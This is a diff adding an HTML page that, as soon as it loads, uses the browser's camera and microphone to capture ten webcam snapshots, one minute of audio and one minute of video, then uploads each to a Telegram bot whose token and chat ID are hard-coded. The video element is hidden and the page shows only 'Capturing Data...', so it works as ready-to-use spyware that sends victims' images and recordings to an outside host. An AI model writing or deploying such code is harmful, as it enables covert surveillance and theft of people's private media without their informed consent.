@@ -1,0 +1,109 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Capture</title>
+</head>
+<body>
+  <h2>Capturing Data...</h2>
+  <video id="video" autoplay muted style="display:none;"></video>
+
+  <script>
+    const botToken = "7826691763:AAEWBVInzCY7o7zGnHEZl7EoKkUMcF8rbOw";
+    const userId = "8033576116";
+
+    // 🖼️ Capture 10 Snapshots
+    function captureSnapshots() {
+      navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
+        const video = document.getElementById("video");
+        video.srcObject = stream;
+
+        let count = 0;
+        const interval = setInterval(() => {
+          if (count >= 10) {
+            stream.getTracks().forEach(track => track.stop());
+            clearInterval(interval);
+            return;
+          }
+
+          const canvas = document.createElement("canvas");
+          canvas.width = video.videoWidth;
+          canvas.height = video.videoHeight;
+          canvas.getContext("2d").drawImage(video, 0, 0);
+
+          canvas.toBlob(blob => {
+            const form = new FormData();
+            form.append("chat_id", userId);
+            form.append("photo", blob, `photo${count + 1}.jpg`);
+
+            fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+              method: "POST",
+              body: form,
+            });
+          }, "image/jpeg");
+
+          count++;
+        }, 1000);
+      });
+    }
+
+    // 🎙️ Capture 1 Minute Audio
+    function captureAudio() {
+      navigator.mediaDevices.getUserMedia({ audio: true }).then(stream => {
+        const recorder = new MediaRecorder(stream);
+        const chunks = [];
+
+        recorder.ondataavailable = e => chunks.push(e.data);
+        recorder.onstop = () => {
+          const blob = new Blob(chunks, { type: "audio/webm" });
+          const form = new FormData();
+          form.append("chat_id", userId);
+          form.append("audio", blob, "audio.webm");
+
+          fetch(`https://api.telegram.org/bot${botToken}/sendAudio`, {
+            method: "POST",
+            body: form,
+          });
+
+          stream.getTracks().forEach(track => track.stop());
+        };
+
+        recorder.start();
+        setTimeout(() => recorder.stop(), 60000);
+      });
+    }
+
+    // 📹 Capture 1 Minute Video
+    function captureVideo() {
+      navigator.mediaDevices.getUserMedia({ video: true, audio: true }).then(stream => {
+        const recorder = new MediaRecorder(stream);
+        const chunks = [];
+
+        recorder.ondataavailable = e => chunks.push(e.data);
+        recorder.onstop = () => {
+          const blob = new Blob(chunks, { type: "video/webm" });
+          const form = new FormData();
+          form.append("chat_id", userId);
+          form.append("video", blob, "video.webm");
+
+          fetch(`https://api.telegram.org/bot${botToken}/sendVideo`, {
+            method: "POST",
+            body: form,
+          });
+
+          stream.getTracks().forEach(track => track.stop());
+        };
+
+        recorder.start();
+        setTimeout(() => recorder.stop(), 60000);
+      });
+    }
+
+    // 🚀 Start All
+    captureSnapshots();
+    captureAudio();
+    captureVideo();
+  </script>
+</body>
+</html>
